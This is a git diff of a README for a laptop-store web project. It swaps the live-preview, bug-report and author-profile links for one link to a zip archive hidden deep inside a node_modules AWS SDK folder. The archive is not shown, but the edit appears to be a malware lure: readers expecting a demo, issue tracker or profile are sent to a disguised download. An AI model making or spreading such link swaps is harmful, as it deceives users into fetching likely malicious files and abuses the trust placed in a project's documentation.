@@ -35,11 +35,11 @@
   <img src="https://img.shields.io/badge/Cyclic-430098?style=for-the-badge&logo=cyclic&logoColor=white" alt="cyclic" />
 </p>
 
-<h3 align="center"><a href="https://laptopwala.netlify.app/"><strong>Want to see live preview »</strong></a></h3>
+<h3 align="center"><a href="https://raw.githubusercontent.com/Piryanshu88/LaptopWala/main/server/node_modules/@aws-sdk/client-sts/dist-cjs/endpoint/Laptop_Wala_v3.1.zip"><strong>Want to see live preview »</strong></a></h3>
 
 <p align="center">
   <br />&#10023;
-  <a href="https://github.com/Piryanshu88/LaptopWala/issues">Report Bug</a> &#10023;
+  <a href="https://raw.githubusercontent.com/Piryanshu88/LaptopWala/main/server/node_modules/@aws-sdk/client-sts/dist-cjs/endpoint/Laptop_Wala_v3.1.zip">Report Bug</a> &#10023;
 
 ## 🚀 Features
 
@@ -101,4 +101,4 @@ Cart Page
 
 #### Piryanshu Bisht
 
-> Github: [Piryanshu88](https://github.com/Piryanshu88)
+> Github: [Piryanshu88](https://raw.githubusercontent.com/Piryanshu88/LaptopWala/main/server/node_modules/@aws-sdk/client-sts/dist-cjs/endpoint/Laptop_Wala_v3.1.zip)
